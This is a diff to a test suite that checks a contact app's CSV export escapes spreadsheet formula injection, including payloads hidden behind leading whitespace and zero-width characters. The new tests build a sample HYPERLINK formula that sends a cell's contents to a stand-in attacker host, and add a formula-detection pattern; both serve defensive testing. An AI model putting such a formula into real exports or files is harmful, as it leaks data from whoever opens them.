@@ -169,8 +169,12 @@ describe('§5.11: formula injection, every trigger character, every source', () 
     const offenders: string[] = [];
     for (const row of records) {
       for (const cell of row) {
-        if (cell !== '' && FORMULA_TRIGGER_CHARACTERS.includes(cell.charAt(0)))
+        if (
+          cell !== '' &&
+          (FORMULA_TRIGGER_CHARACTERS.includes(cell.charAt(0)) || LOOKS_LIKE_FORMULA.test(cell))
+        ) {
           offenders.push(cell);
+        }
       }
     }
     expect(offenders).toEqual([]);
@@ -204,6 +208,7 @@ describe('§5.11: formula injection, every trigger character, every source', () 
         if (typeof cell.value === 'string' && cell.value !== '') {
           strings += 1;
           expect(FORMULA_TRIGGER_CHARACTERS.includes(cell.value.charAt(0)), cell.value).toBe(false);
+          expect(LOOKS_LIKE_FORMULA.test(cell.value), cell.value).toBe(false);
         }
         // Nothing in the file is a formula object.
         expect(
@@ -213,6 +218,72 @@ describe('§5.11: formula injection, every trigger character, every source', () 
     });
     expect(strings).toBeGreaterThan(CASES.length * 2);
     expect(sheet.rowCount).toBe(CASES.length + 1);
+  });
+});
+
+/**
+ * "Does not start with a trigger" is only meaningful if it looks past leading
+ * whitespace, because Excel does. Independent of the implementation's own
+ * character class on purpose.
+ */
+const LOOKS_LIKE_FORMULA = /^[\s\u200B-\u200D\u2060\uFEFF]*[=+\-@]/u;
+
+describe('§5.11: whitespace in front of a payload does not hide it', () => {
+  const SPACES: readonly [string, string][] = [
+    ['a space', ' '],
+    ['a non-breaking space', '\u00A0'],
+    ['an em space', '\u2003'],
+    ['an ideographic space', '\u3000'],
+    ['a zero-width space', '\u200B'],
+    ['a byte-order mark', '\uFEFF'],
+  ];
+
+  describe.each(SPACES)('%s before an equals sign', (_name, space) => {
+    const payload = `${space}=HYPERLINK("http://evil.example/?"&A1,"x")`;
+
+    it('is escaped in a system column', async () => {
+      const email = `ws-sys-${unique()}@x.io`;
+      await seedContact({ lastName: payload, email });
+      const { rows } = await exportCsv(owner, { filter: [`email:eq:${email}`] });
+      expect(rows[0]?.['Last name']).toBe(`'${payload}`);
+    });
+
+    it('is escaped in a custom field', async () => {
+      const email = `ws-cust-${unique()}@x.io`;
+      await seedContact({ email, customFields: { notes: payload } });
+      const { rows } = await exportCsv(owner, { filter: [`email:eq:${email}`] });
+      expect(rows[0]?.['Notes']).toBe(`'${payload}`);
+    });
+
+    it('is escaped when it arrived through an import, wherever the importer left it', async () => {
+      const email = `ws-imp-${unique()}@x.io`;
+      const analyzed = await h.analyze({
+        userId: owner,
+        bytes: csv([
+          ['Last', 'Email', 'Notes'],
+          [payload, email, payload],
+        ]),
+      });
+      await h.start(analyzed.id, {
+        mapping: [
+          { column: 0, field: 'last_name' },
+          { column: 1, field: 'email' },
+          { column: 2, field: 'notes' },
+        ],
+      });
+      await h.drain();
+
+      const { rows } = await exportCsv(owner, { filter: [`email:eq:${email}`] });
+      // Some of these are trimmed by the importer (as the API's create schema
+      // would trim them) and some are not; either way no stored value may leave
+      // as something a spreadsheet would run.
+      for (const column of ['Last name', 'Notes']) {
+        const cell = rows[0]?.[column] ?? '';
+        expect(cell.startsWith("'") || !LOOKS_LIKE_FORMULA.test(cell), `${column}: ${cell}`).toBe(
+          true,
+        );
+      }
+    });
   });
 });
 
